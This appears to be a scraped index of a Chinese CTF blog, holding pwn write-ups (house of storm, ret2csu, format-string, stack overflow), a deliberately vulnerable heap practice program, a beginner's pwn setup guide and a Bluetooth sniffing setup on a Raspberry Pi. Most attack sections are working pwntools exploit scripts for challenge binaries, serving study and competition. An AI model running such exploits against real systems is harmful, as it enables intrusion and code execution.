libc----------------------------------##由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址payload = p64(0)*6 + p64(0x13370800)edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0payload = p64(0)*3 +p64(0x13377331)  #满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(fake_chunk+3) + p64(8)   #chunk1edit(0, payload) #满足show的条件show(1)  #我们刚刚house of storm 写的地址泄漏出来p.recvuntil(&quot;]: &quot;)heap = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))success(&quot;heap:%s&quot;+hex(heap))payload  = p64(0)*3 + p64(0x13377331)#满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(heap+0x10) + p64(8) #chunk1edit(0, payload)show(1) #泄漏libc地址p.recvuntil(&quot;]: &quot;)malloc_hook = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) -0x58 - 0x10libc_base = malloc_hook - libc.sym[&#x27;__malloc_hook&#x27;]free_hook = libc_base+libc.sym[&#x27;__free_hook&#x27;]system = libc_base+ libc.sym[&#x27;system&#x27;]success(&quot;free_hook:%s&quot;+hex(free_hook))#--------------修改 free_hook -----------------------------------#payload  = p64(0)*4payload += p64(free_hook) + p64(0x100)#chunk0payload += p64(0x13370800+0x40) + p64(8)#chunk1payload += b&#x27;/bin/sh\\x00&#x27;edit(0, payload)edit(0, p64(system))delete(1)p.interactive()\n\n\nI am the storm that is approaching我即是那迫近的风暴Provoking black clouds in isolation唤醒樊笼中的乌云I am reclaimer of my name我要收回我的真名Born in flames, I have been blessed生于火焰 受尽祝福My family crest is a demon of death!死亡恶魔即是我的家徽Forsakened, I am awakened觉醒时已被遗弃A phoenix&#x27;s ash in dark divine凤凰的灰烬在黑暗神灵旁飘落Descending misery苦难降临Destiny chasing time命运追逐着时光","categories":["heap"],"tags":["bin"]},{"title":"preparation_4_binattacks","url":"/2023/08/28/preparation-4-binattacks/","content":"写了段代码来gank接下来的堆,之后几篇文章都用这作为二进制文件基础\n//gcc 2heap.c  -no-pie -o 2heap#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];void init()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123;    puts(&quot;what u want to do next?&quot;);    puts(&quot;1. Build a house&quot;);\tputs(&quot;2. Delete a house&quot;);\tputs(&quot;3. Edit your house&quot;);\tputs(&quot;4. Show your house&quot;);    puts(&quot;&gt;&quot;);&#125;void add()&#123;    char size[20];    if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123;        if(!chunk_ptr[chunk_time])&#123;        printf(&quot;You have built %d houses in my world\\n&quot;,chunk_time);        puts(&quot;You can customize the size of house here, but what about your life&quot;);        read(0,size,0x8);        chunk_size[chunk_time] = atoi(size);\t\tchunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]);\t\tputs(&quot;add something to your house&quot;);        read(0,chunk_ptr[chunk_time],chunk_size[chunk_time]);        chunk_time++;        &#125;else&#123;            puts(&quot;something wrong,but you can come in any time&quot;);            exit(0);        &#125;    &#125;else&#123;                puts(&quot;something wrong,but you can come in any time&quot;);        exit(0);    &#125;&#125;void delete()&#123;    int index;    puts(&quot;I won&#x27;t set the pointer to zero&quot;);    puts(&quot;every decision you made is meaningful&quot;);    scanf(&quot;%d&quot;,&amp;index);    free(chunk_ptr[index]);&#125;void edit()&#123;    int index;    puts(&quot;something wrong?&quot;);    puts(&quot;It&#x27;s never too late to make changes&quot;);    scanf(&quot;%d&quot;,&amp;index);    puts(&quot;something interesting here&quot;);    read(0,&amp;chunk_size[index],0x8);    puts(&quot;Nice choice!&quot;);    puts(&quot;Now add something&quot;);    read(0,chunk_ptr[index],chunk_size[index]);    puts(&quot;ok\\n&quot;);&#125;void show()&#123;    puts(&quot;Nothing is perfect,but you can make something different&quot;);    puts(&quot;Let&#x27;s see what you can do&quot;);    int index;    scanf(&quot;%d&quot;,&amp;index);    puts(chunk_ptr[index]);&#125;int main()&#123;    int choice;    init();    puts(&quot;This program is used to explore something about heap&quot;);    puts(&quot;written by str1k3&quot;);    puts(&quot;Welcome to my world!&quot;);    puts(&quot;In my world,you can build up some houses&quot;);        while(1)&#123;        menu();        scanf(&quot;%d&quot;,&amp;choice);        switch(choice)&#123;            case 1:                add();                break;            case 2:                delete();                break;            case 3:                edit();                break;            case 4:                show();                break;            case 5:                puts(&quot;ready to exit?&quot;);                puts(&quot;back to your life!&quot;);                exit(0);                break;        &#125;    &#125;&#125;\n其实人生，并非虚耗。何来尘埃飞舞？ ——陈奕迅《沙龙》\n扔个测试脚本在这里先\nfrom struct import packfrom ctypes import *from LibcSearcher import *from pwn import *def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&quot;./2heap&quot;)elf = ELF(&quot;./2heap&quot;)#libc = ELF(&quot;./libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def add(size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(&quot;You can customize the size of house here, but what about your life&quot;)    p.sendline(str(size))    p.recvuntil(&quot;add something to your house&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(&quot;I won&#x27;t set the pointer to zero, every decision you made,is meaningful.&quot;)    p.sendline(str(index))def edit(index,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(&quot;It&#x27;s never too late to make changes.&quot;)    p.sendline(str(index))    p.recvuntil(&quot;something interesting here&quot;)    p.sendline(str(size))    p.recvuntil(&quot;Nice choice!&quot;)    p.send(payload)def show(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))\n\n","categories":["heap"],"tags":["bin"]},{"title":"pwn入门指北","url":"/2023/07/02/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/","content":"To all begin pwnner\n什么是Pwn    “Pwn”是一个拟声词，代表着攻破，获取权限，由”own”一次引申而来。在CTF比赛中，一道pwn题通常会给解题者提供二进制文件，一个靶机。解题者需要通过对二进制文件进行逆向分析，找到其中的漏洞并对漏洞加以利用，最终实现对靶机的提权（简单pwn题的解题详见真.入门之一道pwn题）。\n学Pwn能学到什么    1.亿点点的逆向工程。大部分Pwn题都要求先对二进制文件进行逆向分析，掌握一定的逆向技巧是必不可少的。同CTF中的reverse侧重于算法稍有不同，Pwn题的逆向侧重于漏洞的发现与利用。   2.C语言与汇编语言以及python。阅读二进制文件反汇编出的汇编代码与反编译后的伪代码需要有一定的C语言与汇编语言基础。漏洞利用所常用的pwntools库的使用需要一丢丢的python编程基础。    3.数据结构与操作系统。CTF中的Pwn题一般涉及栈溢出、堆溢出等漏洞，要求解题者对数据结构有比较深的理解。同时，由于Pwn靶机一般是Linux系统的靶机，二进制文件也在Linux环境下编译运行，因此，学会熟练使用、深入理解Linux系统是每个Pwn解题者的必修课。学Pwn需要有的心理准备    1.自学拉满：本队伍没有强Pwn手，手把手教学什么的应该没有。Pwn涉及的计算机底层知识较多，需要你深入学习并理解。    2.坐牢准备：Pwn所需的前置知识比较多，0基础入门者可能很久都解不了什么题    3.做好准备跟真正的爷爷竞争。\n真.入门之环境配置如果你准备好踏入Pwn的大门，我们先从环境配置开始吧    https://mirrors.tuna.tsinghua.edu.cn/    在这里找个纯净的Ubuntu镜像文件，18.04到22.04之间的都可以（建议不要用kali，用来做过渡可以，但是会有些问题；22.04以上太新，也会有问题。存储空间富有者当我没说），先搭建起自己的虚拟机吧。    这里说说原因哈，python的pwntools在Windows环境下运行会有些问题，此外当你自己研究时也需要用到Linux环境。    https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/看这里换源更新\nsudo apt update &amp;&amp;sudo apt upgrade -ysudo apt install python3\n（ps：以下安装过程中会下载所需的依赖，比较吃网络环境，如果不成功可以多试几次）装pip\nsudo apt install pip\n装pwntools，这个库非常有用，是你的左膀右臂（很重要，最好有时间能精读它的手册）\npip install pwntools\n装git，这个用来下github上的东西\nsudo apt install git\n装pwndbg，这个是gdb的插件，在调试方面能给你很大帮助（调试方法请自学，很重要）先装四个库不然会报错（主要是linux下64位和32位的环境）\nsudo apt-get install libffi-devsudo apt-get install libssl-devsudo apt install libc6-dev-i386sudo apt-get install lib32z1cd Desktopgit clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.shcd ..\n装ROPgadget，这个工具能帮你找到二进制文件中可用的gadget，也可以直接对静态编译的二进制文件生成ROP链\nsudo apt-get install python-capstonegit clone https://github.com/JonathanSalwan/ROPgadget.gitcd ROPgadgetsudo -H python3 setup.py install\none_gadget，这个工具能帮你找到一些危险的可以加以利用的汇编片段\nsudo apt-get install ruby ruby-devsudo gem install one_gadget\nseccomp-tools,这个工具是查sandbox用的\nsudo apt install gcc ruby-devgem install seccomp-tools\n真.入门之一道pwn题以下是一道pwn题，不是最简单的，但是很好地展现了pwn手解题的过程，因此放在这里【HDCTF2023】pwnner考点：已知种子随机数预测+简单栈溢出覆盖返回地址查个保护先\n┌──(str1d3r㉿str1k3Gwindows)-[~/Desktop]└─$ checksec pwnner[*] &#x27;/Desktop/pwnner&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)```  开了NX，不能直接在栈上执行shellcode（各类保护是需要知道的）进IDA，看vuln函数，F5反编译，发现需要经过一次输入随机数的判断才能到达漏洞执行处，由于程序给了随机数种子（伪随机），我们可以通过直接在本地生成一个随机数来通过验证，到达漏洞所在处完成利用```c__int64 vuln()&#123;  int v0; // ebx  char buf[16]; // [rsp+0h] [rbp-50h] BYREF  char v3[64]; // [rsp+10h] [rbp-40h] BYREF  srand(0x39u); //种子为0x39的随机数生成  puts(&quot;you should prove that you love pwn,so input your name:&quot;);  read(0, buf, 0x10uLL); //存在溢出  v0 = atoi(buf);  if ( v0 == rand() )  &#123;    puts(&quot;ok,you have a little cognition about pwn,so what will you do next?&quot;);    read(0, v3, 0x100uLL);  &#125;  else  &#123;    puts(&quot;sorry,you are not a real pwnner&quot;);  &#125;  return 0LL;&#125;\n又发现：getshell函数内直接有system(‘&#x2F;bin&#x2F;sh’),所以思路如下先通过随机数预测，再利用溢出点覆盖函数返回地址，跳到getshell函数成功getshell随机数预测脚本：\n#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;time.h&gt;int main()&#123;                srand(0x39u);        int v4 = rand();        printf(&quot;%d, &quot;,v4);&#125;\n直接贴脚本\nfrom pwn import*       #引入pwntools库elf=ELF(&#x27;./pwnner&#x27;)  context.log_level = &#x27;debug&#x27; #这个能看到回显p = remote(&#x27;node1.anna.nssctf.cn&#x27;,28090)#链接靶机p.recvuntil(&#x27;you should prove that you love pwn,so input your name:&#x27;)p.send(b&#x27;1956681178&#x27;) #通过随机数检验payload = b&#x27;a&#x27;*64+b&#x27;b&#x27;*8+p64(0x4008b2)#填充垃圾数据，覆盖8位的返回地址，再跳转到getshell函数获得shellp.send(payload)    #发送payloadp.interactive()    #交互\n成功拿到shell\n","categories":["basic"],"tags":["Linux"]},{"title":"ret2csu","url":"/2023/11/10/ret2csu/","content":"最近才见到一题用csu解题的顺便整理一波做栈题经常能看见__libc_csu_init这个函数，能不能加以利用呢\n在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。__libc_csu_init in IDA\n.text:0000000000400900                               ; void __fastcall _libc_csu_init(unsigned int, __int64, __int64).text:0000000000400900                               public __libc_csu_init.text:0000000000400900                               __libc_csu_init proc near               ; DATA XREF: _start+16↑o.text:0000000000400900                               ; __unwind &#123;.text:0000000000400900 41 57                         push    r15.text:0000000000400902 41 56                         push    r14.text:0000000000400904 49 89 D7                      mov     r15, rdx.text:0000000000400907 41 55                         push    r13.text:0000000000400909 41 54                         push    r12.text:000000000040090B 4C 8D 25 7E 04 20 00          lea     r12, __frame_dummy_init_array_entry.text:0000000000400912 55                            push    rbp.text:0000000000400913 48 8D 2D 7E 04 20 00          lea     rbp, __do_global_dtors_aux_fini_array_entry.text:000000000040091A 53                            push    rbx.text:000000000040091B 41 89 FD                      mov     r13d, edi.text:000000000040091E 49 89 F6                      mov     r14, rsi.text:0000000000400921 4C 29 E5                      sub     rbp, r12.text:0000000000400924 48 83 EC 08                   sub     rsp, 8.text:0000000000400928 48 C1 FD 03                   sar     rbp, 3.text:000000000040092C E8 4F FD FF FF                call    _init_proc.text:000000000040092C.text:0000000000400931 48 85 ED                      test    rbp, rbp.text:0000000000400934 74 20                         jz      short loc_400956.text:0000000000400934.text:0000000000400936 31 DB                         xor     ebx, ebx.text:0000000000400938 0F 1F 84 00 00 00 00 00       nop     dword ptr [rax+rax+00000000h].text:0000000000400938.text:0000000000400940.text:0000000000400940                               loc_400940:                             ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400940 4C 89 FA                      mov     rdx, r15.text:0000000000400943 4C 89 F6                      mov     rsi, r14.text:0000000000400946 44 89 EF                      mov     edi, r13d.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8].text:0000000000400949.text:000000000040094D 48 83 C3 01                   add     rbx, 1.text:0000000000400951 48 39 DD                      cmp     rbp, rbx.text:0000000000400954 75 EA                         jnz     short loc_400940.text:0000000000400954.text:0000000000400956.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400956 48 83 C4 08                   add     rsp, 8.text:000000000040095A 5B                            pop     rbx.text:000000000040095B 5D                            pop     rbp.text:000000000040095C 41 5C                         pop     r12.text:000000000040095E 41 5D                         pop     r13.text:0000000000400960 41 5E                         pop     r14.text:0000000000400962 41 5F                         pop     r15.text:0000000000400964 C3                            retn.text:0000000000400964                               ; &#125; // starts at 400900.text:0000000000400964.text:0000000000400964                               __libc_csu_init endp\nfirst_csu\n.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400956 48 83 C4 08                   add     rsp, 8.text:000000000040095A 5B                            pop     rbx.text:000000000040095B 5D                            pop     rbp.text:000000000040095C 41 5C                         pop     r12.text:000000000040095E 41 5D                         pop     r13.text:0000000000400960 41 5E                         pop     r14.text:0000000000400962 41 5F                         pop     r15.text:0000000000400964 C3                            retn\nsecond_csu\n.text:0000000000400940                               loc_400940:                             ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400940 4C 89 FA                      mov     rdx, r15.text:0000000000400943 4C 89 F6                      mov     rsi, r14.text:0000000000400946 44 89 EF                      mov     edi, r13d.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8].text:0000000000400949.text:000000000040094D 48 83 C3 01                   add     rbx, 1.text:0000000000400951 48 39 DD                      cmp     rbp, rbx.text:0000000000400954 75 EA                         jnz     short loc_400940\n在first_csu，我们可以靠栈溢出的数据构造来控制rbx,rbp,r12,r13,r14,r15 寄存器的数据在second_csu，r15赋值给rdx，r14赋值给rsi，r13d赋值给edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位）\n在0x40094D我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 &#x3D; rbp，这样我们就不会执行loc_400940，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1\n手搓\ndef ret2csu(rbx,rbp,r12,r13,r14,r15):    payload = &#x27;a&#x27;*(padding)    payload += p64(first_csu)    payload += p64(rbx)+p64(rbp)#一般：rbx = 0 ,rbp = 1    payload += p64(r12) #call.addr    payload += p64(r13) + p64(r14) + p64(r15) #三个参数    payload += p64(second_csu)    payload += &#x27;a&#x27;*( 7 * 8 )    return payload\npwntools集成(stack privoting_version)\nfrom pwn import*context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)r = ROP(binary_file)r.ret2csu(edi=0, rsi=0x601038, rdx=0x200, rbp=0x601038, call=elf.got[&#x27;read&#x27;])payload += r.chain()payload += p64(leave_ret)payload = payload.ljust(0x100, b&#x27;a&#x27;)p.send(payload)\n\n\n[鹏城杯2023 silent]checksec,full relro\n[*] &#x27;/mnt/Desktop/鹏城/silent/silent&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n开了沙盒程序很简单,很多函数都没法复用有csu，能用read\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[64]; // [rsp+10h] [rbp-40h] BYREF  init_seccomp();  alarm(0x1Eu);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  read(0, buf, 0x100uLL);  return 0;&#125;\nret2csu改stdin为read多次call read来泄露libc并写入orw的shellcode看wp是1&#x2F;4096的概率打通\nfrom pwn import *from pwn import p64,u64binary = ELF(&quot;./silent&quot;)def exploit():    #p = process(&quot;./silent&quot;)    p=remote(&#x27;172.10.0.8&#x27;,9999)    #context.log_level = &#x27;debug&#x27;    context.log_level = &#x27;error&#x27;    # pause()    pop_rdi = 0x0000000000400963    pop_rsi_r15 = 0x0000000000400961    mov_rax_got = 0x0000000000400869    leave_ret = 0x0000000000400876      payload  = b&#x27;a&#x27; * 0x48    context.arch = &#x27;amd64&#x27;    r = ROP(binary)    r.ret2csu(edi=0, rsi=0x601038, rdx=0x110, rbp=0x601038, call=binary.got[&#x27;read&#x27;])    payload += r.chain()    payload += p64(leave_ret)    payload = payload.ljust(0x100, b&#x27;a&#x27;)    p.send(payload)    jmp_rbp = 0x0000000000400a93    # : jmp qword ptr [rbp];     payload = b&#x27;a&#x27; * 8    r = ROP(binary)    r.ret2csu(edi=0, rsi=0x601030, rdx=3, rbp=0x601030, call=binary.got[&#x27;read&#x27;])    payload += r.chain()    payload += p64(pop_rdi)    payload += p64(0x600fd8)#[0x600fd8] alarm@GLIBC_2.2.5 -&gt; 0x7ffff7e772c0 (alarm) ◂— mov eax, 0x25    payload += p64(jmp_rbp)    r = ROP(binary)    r.ret2csu(edi=0, rsi=0x601148, rdx=0x100, rbp=0x601030, call=binary.got[&#x27;read&#x27;])    payload += r.chain()    p.send(payload)    # pause()    # sleep(0.5)    p.send(b&#x27;\\x70\\x29\\x84&#x27;)    try:        libc = u64(p.recvline(timeout=1)[:-1].ljust(8, b&#x27;\\x00&#x27;)) - 0xe44f0    except:        p.close()    else:        if libc &lt; 0:            return        success(f&quot;libc: &#123;hex(libc)&#125;&quot;)        pop_rsi = libc + 0x0000000000023a6a        pop_rdx = libc + 0x0000000000001b96        ret = 0x0000000000400696        flag_str = 0x6011e0        # payload = p64(one_gadget)        payload = p64(pop_rdi)        payload += p64(flag_str)        payload += p64(pop_rsi)        payload += p64(0)        payload += p64(libc + 0x10fbf0) # open        payload += p64(pop_rdi)        payload += p64(3)        payload += p64(pop_rsi)        payload += p64(flag_str)        payload += p64(pop_rdx)        payload += p64(0x100)        payload += p64(libc + 0x110020) # read        payload += p64(pop_rdi)        payload += p64(1)        payload += p64(pop_rsi)        payload += p64(flag_str)        payload += p64(pop_rdx)        payload += p64(0x100)        payload += p64(libc + 0x1100f0) # write        payload += b&#x27;./flag&#x27;        # pause()        sleep(1)        p.send(payload)        p.interactive()        p.close()        exit(0)count = 0while True:    print(f&quot;try: &#123;count&#125;&quot;)    count += 1    exploit()p.interactive()\n\n\n[DASCTF11月月赛(2023) A_Sad_story]开了pie直接看主要的漏洞点，这里有个选择选一可以拿到基址选二可以有次溢出（长度几乎无限制）但是走完会有段sandbox直接上exp，记录这波sandbox的绕过\nfrom pwn import *context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;libc = ELF(&#x27;./libc-2.31.so&#x27;)  elf = ELF(&#x27;./challenge&#x27;)      p = process(&quot;./challenge&quot;)#p = remote(&quot;node4.buuoj.cn&quot;, 28133)def elf_base():    p.sendlineafter(b&#x27;: &#x27;, b&#x27;1&#x27;)    p.sendlineafter(b&#x27;: &#x27;, b&#x27;1&#x27;)    p.recvuntil(b&#x27;0x&#x27;)    value = int(p.recv(12), 16) - 0x1249    return valueelf.address = elf_base()success(&quot;elf--&gt; %s&quot; + hex(elf.address))csu1 = elf.address + 0x1620csu2 = elf.address + 0x163aoffset = b&#x27;a&#x27; * 0x38# Craft the ROP chainrop_chain = [    csu2, 0, 1, 0, elf.got[&#x27;close&#x27;], 1, elf.got[&#x27;read&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 0, elf.address + 0x4280, 257, elf.got[&#x27;read&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 0, elf.address + 0x4280, 0, elf.got[&#x27;close&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 1, elf.address + 0x4280, 0x30, elf.got[&#x27;read&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 0, elf.address + 0x4280 + 0x30, 1, elf.got[&#x27;read&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 2, elf.address + 0x4280, 0x30, elf.got[&#x27;close&#x27;],    csu1]#大佬的构造，以下我改成我熟悉的样子(def ret2csu(rbx,rbp,r12,r13,r14,r15):    payload = p64(csu2)    payload += p64(rbx)+p64(rbp)#一般：rbx = 0 ,rbp = 1    payload += p64(r12) #call.addr    payload += p64(r13) + p64(r14) + p64(r15) #三个参数    payload += p64(csu1)    payload += p64(0)*7    return payloadrop_chain =ret2csu(0,1,0,elf.got[&#x27;close&#x27;],1,elf.got[&#x27;read&#x27;]) rop_chain +=ret2csu(0, 1, 0, elf.address + 0x4280, 257, elf.got[&#x27;read&#x27;])rop_chain +=ret2csu(0, 1, 0, elf.address + 0x4280, 0, elf.got[&#x27;close&#x27;])rop_chain +=ret2csu(0, 1, 1, elf.address + 0x4280, 0x30, elf.got[&#x27;read&#x27;])rop_chain +=ret2csu(0, 1, 0, elf.address + 0x4280 + 0x30, 1, elf.got[&#x27;read&#x27;])rop_chain +=ret2csu(0, 1, 2, elf.address + 0x4280, 0x30, elf.got[&#x27;close&#x27;])payload2 = rop_chainpayload = b&#x27;&#x27;.join([p64(addr) for addr in rop_chain])p.sendline(b&#x27;2&#x27;)p.sendline(offset + payload)p.send(b&#x27;\\x15&#x27;)p.send(b&#x27;/flag&#x27; + b&#x27;\\x00&#x27; * (257 - 5))p.send(b&#x27;\\x00&#x27; * 1)p.interactive()","categories":["stack"],"tags":["rop"]},{"title":"基于树莓派5的蓝牙嗅探环境配置","url":"/2024/01/18/raspberrypi/","content":"首先树莓派的环境配置我的是树莓派5，选了64位的记得高级选项里面开ssh服务和配置WIFI烧录完把SD卡插进插槽就可以启动了\n稍微吐槽一下他的接口，有点难插），所以还是喜欢用ssh\nsd卡的插槽在背面（我先把外壳装上了找了老久233）\n搞起来之后在路由器的后台就能找到树莓派的ip\n试过用tigervnc搞远程桌面，延迟挺大的，但能用\n这里有个后续，看文章末尾\n连上开始配环境\n换个源先\nsudo apt install vimsudo vim /etc/apt/sources.list\n改成以下\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian bookworm main contrib non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian-security bookworm-security main contrib non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian bookworm-updates main contrib non-free-firmware\n还有一处\nsudo vim /etc/apt/sources.list.d/raspi.list\n改成以下\ndeb https://mirrors.tuna.tsinghua.edu.cn/raspberrypi bookworm main\n\n我用的设备是ubertoolth one可以跟这个文档https://ubertooth.readthedocs.io/en/latest/index.html但是树莓派5是debian12的了，wireshark也有更新，会有些小问题\n先装蓝牙依赖\nsudo apt install cmake libusb-1.0-0-dev make gcc g++ libbluetooth-dev wget \\pkg-config python3-numpy python3-qtpy python3-distutils python3-setuptools\nlibbtbb：\nwget https://github.com/greatscottgadgets/libbtbb/archive/2020-12-R1.tar.gz -O libbtbb-2020-12-R1.tar.gztar -xf libbtbb-2020-12-R1.tar.gzcd libbtbb-2020-12-R1mkdir buildcd buildcmake ..makesudo make installsudo ldconfig\nubertooth tools：\nwget https://github.com/greatscottgadgets/ubertooth/releases/download/2020-12-R1/ubertooth-2020-12-R1.tar.xztar -xf ubertooth-2020-12-R1.tar.xzcd ubertooth-2020-12-R1/hostmkdir buildcd buildcmake ..makesudo make installsudo ldconfig\n装wireshark和ubertooth插件以下cmake的时候会有问题\nsudo apt-get install wireshark wireshark-dev libwireshark-dev cmakecd libbtbb-2020-12-R1/wireshark/plugins/btbbmkdir buildcd buildcmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/aarch-linux-gnu/wireshark/plugins/4.0/epan .. makesudo make install\n我瞎搞做了以下操作\nexport C_INCLUDE_PATH=/usr/include/wiresharkexport CPLUS_INCLUDE_PATH=/usr/include/wireshark\n然后在&#x2F;usr&#x2F;include&#x2F;wireshark下给他创了一个config.h（啥都没写的）编译就过了 :) 虽然很多警告\n以下同理，安装蓝牙插件\nsudo apt-get install wireshark wireshark-dev libwireshark-dev cmakecd libbtbb-2020-12-R1/wireshark/plugins/btbredrmkdir buildcd buildcmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/aarch-linux-gnu/wireshark/plugins/4.0/epan ..makesudo make install\n设置wireshark权限\nsudo groupadd wiresharksudo chgrp wireshark /usr/bin/dumpcapsudo chmod 4755 /usr/bin/dumpcapsudo gpasswd -a 你的用户名 wireshark\n\n开冲在tmp下\nrm pipemkfifo pipe\n然后在wireshark设置（这里没截图，用了我ubuntu上的wireshark，但是同理）然后在命令行\nubertooth-btle -f -c /tmp/pipe\n需要注意的是以上两个步骤不能反过来，会有问题然后就可以开始嗅探了可以看到wireshark中的抓包内容\n后续回学校之后不知道为什么micro-HDMI连不上屏幕了，不得已还是得搞个vnc，记录一下\n命令行\nsudo raspi-config\n然后\n远程桌面正常连接就行\n","categories":["plays"],"tags":["plays"]},{"title":"qwb2023","url":"/2023/12/20/qwb2023/","content":"qwb_pwn附件下载，请注意为动态附件（应该pwn没影响吧）qwb2023_wp_written_by_Hor1zon强网先锋外啥也不会，明年再来\n[qwb2023 强网先锋-ez_fmt]checksec: vuln:gift会泄露栈顶地址，动调可以算出ret参数的地址格式化字符串漏洞任意地址写，可以劫持返回地址，利用printf函数泄露libc地址给了libc文件，直接尝试打one_gadget\nfrom pwn import *from pwn import p64def debug():    gdb.attach(p)    pause()#r=remote(&#x27;47.104.24.40&#x27;,1337)p=process(&#x27;./ez_fmt&#x27;)elf=ELF(&quot;./ez_fmt&quot;)libc=ELF(&quot;./libc-2.31.so&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;)p.recvuntil(b&#x27;There is a gift for you &#x27;)stack_rsp=int(p.recv(14),16)#debug()#-----calc addrstack_printf_ret = stack_rsp - 0x8stack_ret = stack_rsp + 0x78stack_printf = stack_rsp + 0x158success(&#x27;stack_rsp: %s&#x27;,hex(stack_rsp))success(&#x27;stack_ret: %s&#x27;,hex(stack_ret))success(&#x27;stack_printf %s&#x27;,hex(stack_printf))ogg1 = 0xe3afeogg2 = 0xe3b01ogg3 = 0xe3b04stack_printf_ret_addr = stack_printf_ret &amp; 0xffffsuccess(&#x27;stack_printf_ret_addr %s&#x27;,hex(stack_printf_ret_addr))#debug()#-----hijack ret_addr&amp;&amp;leak libc_basepayload=b&#x27;%19$p&#x27;payload+=b&#x27;%&#x27;+str(0x1205-6-8).encode()+b&#x27;c%10$hn&#x27;payload=payload.ljust(0x20,b&#x27;a&#x27;)payload+=p64(stack_printf_ret)p.send(payload)print(b&quot;[*]p1=&quot; + payload)p.recvuntil(b&#x27;0x&#x27;)libc_base=int(p.recv(12),16) - 0xf3 - libc.sym[&#x27;__libc_start_main&#x27;]one=libc_base+ogg2one1=one&amp;0xffffone2=(one&gt;&gt;16)&amp;0xffffsuccess(&#x27;libc_base: %s&#x27;,hex(libc_base))payload=b&#x27;%&#x27;+str(one2).encode()+b&#x27;c%10$hn&#x27;payload+=b&#x27;%&#x27;+str(one1-one2).encode()+b&#x27;c%11$hn&#x27;payload=payload.ljust(0x20,b&#x27;a&#x27;)payload+=p64(stack_ret-0x10+2)+p64(stack_ret-0x10)p.send(payload)print(b&quot;[*]p2=&quot; + payload)p.interactive()\n\n\n[qwb2023 pwn-chatting]逆向就死了 :(首先是64位linux的cpp，保护全开，glibc &#x3D; 2.27程序实现了一个通讯录，功能分别为：添加、删除、列出用户，发送和读取message发现一处UAF：首先程序里有两个存放 message 的地方：\n第一处是 0x2112E0，这个 vector 里面有许多个 entry，每个 entry 存放了所有收件人为某用户的 message。第二处是 0x211280（下图的 LOCAL_MSGLIST_ENTRY），如果 message 的收件人刚好是当前用户 (CURR_USER)，message 